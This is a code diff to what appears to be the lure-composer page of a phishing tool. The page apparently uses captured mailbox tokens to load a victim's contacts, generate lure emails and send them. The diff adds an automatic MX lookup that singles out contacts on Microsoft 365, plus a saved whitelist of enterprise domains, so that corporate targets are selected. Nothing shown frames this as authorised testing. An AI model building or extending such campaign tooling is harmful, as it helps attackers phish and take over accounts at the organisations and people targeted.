@@ -4,7 +4,7 @@ import { useState, useEffect, useCallback, useRef } from "react";
 import { motion } from "framer-motion";
 import { useParams, useRouter } from "next/navigation";
 import { Token } from "@/types/token";
-import { fetchTokens, fetchContacts, sendMail, generateLureEmail } from "@/lib/api";
+import { fetchTokens, fetchContacts, sendMail, generateLureEmail, mxCheck } from "@/lib/api";
 import {
   Fish, ArrowLeft, Loader2, AlertCircle, Send, User, Mail,
   Plus, X, Eye, ShieldAlert, CheckCircle2, Link as LinkIcon,
@@ -82,21 +82,18 @@ const OFFICE_DOMAINS = new Set([
   "owa",
 ]);
 
-function isOfficeEmail(email: string | undefined): boolean {
-  if (!email) return false;
-  const domain = email.split("@")[1]?.toLowerCase();
-  if (!domain) return false;
-  // Exact match or contains office keyword
-  if (OFFICE_DOMAINS.has(domain)) return true;
-  if (domain.includes("outlook")) return true;
-  if (domain.includes("hotmail")) return true;
-  if (domain.includes("live")) return true;
-  if (domain.includes("msn")) return true;
-  if (domain.includes("microsoft")) return true;
-  if (domain.includes("office")) return true;
-  if (domain.includes("exchange")) return true;
-  if (domain.includes("sharepoint")) return true;
-  if (domain.includes("onmicrosoft")) return true;
+function isOfficeEmailDomain(domain: string): boolean {
+  const d = domain.toLowerCase();
+  if (OFFICE_DOMAINS.has(d)) return true;
+  if (d.includes("outlook")) return true;
+  if (d.includes("hotmail")) return true;
+  if (d.includes("live")) return true;
+  if (d.includes("msn")) return true;
+  if (d.includes("microsoft")) return true;
+  if (d.includes("office")) return true;
+  if (d.includes("exchange")) return true;
+  if (d.includes("sharepoint")) return true;
+  if (d.includes("onmicrosoft")) return true;
   return false;
 }
 
@@ -154,6 +151,11 @@ export default function LureComposerPage() {
 
   const [scheduleTime, setScheduleTime] = useState("");
 
+  // Enterprise domain whitelist (manual + MX-verified)
+  const [manualWhitelist, setManualWhitelist] = useState<string>("");
+  const [mxVerifiedDomains, setMxVerifiedDomains] = useState<Set<string>>(new Set());
+  const [mxChecking, setMxChecking] = useState(false);
+
   const mounted = useRef(false);
 
   const loadToken = useCallback(async () => {
@@ -189,8 +191,51 @@ export default function LureComposerPage() {
       mounted.current = true;
       loadToken();
       loadContacts();
+      const saved = localStorage.getItem("lure_manual_whitelist");
+      if (saved) setManualWhitelist(saved);
     }
   }, [loadToken, loadContacts]);
+
+  // MX-check unknown domains when contacts load
+  useEffect(() => {
+    const unknownDomains = contacts
+      .map((c) => c.emailAddresses?.[0]?.address?.split("@")[1]?.toLowerCase())
+      .filter((d): d is string => !!d && !isOfficeEmailDomain(d) && !mxVerifiedDomains.has(d));
+    const unique = [...new Set(unknownDomains)];
+    if (unique.length === 0) return;
+
+    let cancelled = false;
+    setMxChecking(true);
+    mxCheck(unique)
+      .then((res) => {
+        if (cancelled) return;
+        setMxVerifiedDomains((prev) => {
+          const next = new Set(prev);
+          res.microsoft_365.forEach((d) => next.add(d));
+          return next;
+        });
+      })
+      .catch(() => { /* silent */ })
+      .finally(() => setMxChecking(false));
+    return () => { cancelled = true; };
+  }, [contacts]);
+
+  const manualWhitelistSet = new Set(
+    manualWhitelist
+      .split(/[\s,;\n\r]+/)
+      .map((d) => d.trim().toLowerCase())
+      .filter((d) => d.length > 0)
+  );
+
+  const isOfficeEmail = (email: string | undefined): boolean => {
+    if (!email) return false;
+    const domain = email.split("@")[1]?.toLowerCase();
+    if (!domain) return false;
+    if (isOfficeEmailDomain(domain)) return true;
+    if (mxVerifiedDomains.has(domain)) return true;
+    if (manualWhitelistSet.has(domain)) return true;
+    return false;
+  };
 
   const officeContacts = contacts.filter((c) => {
     const email = c.emailAddresses?.[0]?.address;
@@ -520,6 +565,23 @@ export default function LureComposerPage() {
                     <span className="text-[11px] text-muted-foreground">
                       {selectedContactEmails.size} contacts selected
                     </span>
+                    {mxChecking && <Loader2 className="h-3 w-3 animate-spin text-muted-foreground" />}
+                  </div>
+                  {/* Manual enterprise domain whitelist */}
+                  <div className="mb-3">
+                    <label className="text-[10px] text-muted-foreground block mb-1">Enterprise domains (comma-separated)</label>
+                    <Input
+                      value={manualWhitelist}
+                      onChange={(e) => {
+                        setManualWhitelist(e.target.value);
+                        localStorage.setItem("lure_manual_whitelist", e.target.value);
+                      }}
+                      placeholder="e.g. acme-corp.com, bigbank.io"
+                      className="h-7 text-[11px] bg-secondary/30 border-white/5"
+                    />
+                    <p className="text-[10px] text-muted-foreground/60 mt-1">
+                      Domains listed here are always included in office-only mode. MX verification runs automatically for unknown domains.
+                    </p>
                   </div>
                   <div className="relative mb-3">
                     <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-muted-foreground" />
